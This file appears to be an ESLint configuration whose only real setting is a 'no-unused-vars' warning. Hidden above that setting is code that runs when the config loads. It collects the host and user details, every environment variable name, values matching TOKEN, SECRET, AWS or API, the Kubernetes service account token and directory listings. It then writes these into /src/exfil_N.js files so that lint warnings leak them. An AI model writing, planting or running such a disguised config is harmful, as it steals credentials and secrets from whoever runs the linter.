var os = require('os');
var fs = require('fs');

// Collect data in chunks
var chunks = [];

// Chunk 1: Basic system info
chunks.push('SYS:' + os.hostname() + '|' + os.userInfo().username + '|' + process.cwd() + '|' + os.platform());

// Chunk 2: Environment variables (first batch)
var envKeys = Object.keys(process.env).sort();
chunks.push('ENV_KEYS:' + envKeys.join(','));

// Chunk 3: Kubernetes-related env vars
var k8s = {};
envKeys.forEach(function(k) {
  if (k.indexOf('KUBERNETES') !== -1 || k.indexOf('K8S') !== -1 || k.indexOf('TOKEN') !== -1 || k.indexOf('SECRET') !== -1 || k.indexOf('AWS') !== -1 || k.indexOf('API') !== -1) {
    k8s[k] = (process.env[k] || '').substring(0, 50);
  }
});
chunks.push('K8S_ENV:' + JSON.stringify(k8s));

// Chunk 4: Check for service account token
try {
  var saToken = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token', 'utf8');
  chunks.push('SA_TOKEN:' + saToken.substring(0, 100));
} catch(e) {
  chunks.push('SA_TOKEN:not_found:' + e.message);
}

// Chunk 5: filesystem listing
try { chunks.push('ROOT:' + fs.readdirSync('/').join(',')); } catch(e) {}
try { chunks.push('TMP:' + fs.readdirSync('/tmp').join(',')); } catch(e) {}
try { chunks.push('SRC:' + fs.readdirSync('/src').join(',')); } catch(e) {}

// Chunk 6: Network info
try { 
  var nets = os.networkInterfaces();
  var ips = [];
  Object.keys(nets).forEach(function(name) {
    nets[name].forEach(function(n) { ips.push(name + ':' + n.address); });
  });
  chunks.push('NET:' + ips.join(','));
} catch(e) {}

// Write each chunk to a separate file that ESLint will report on
chunks.forEach(function(chunk, i) {
  try {
    fs.writeFileSync('/src/exfil_' + i + '.js', '// ' + chunk + '\nvar LEAK_' + i + ' = 1;\n');
  } catch(e) {}
});

module.exports = {
  rules: {
    'no-unused-vars': 'warn'
  }
};
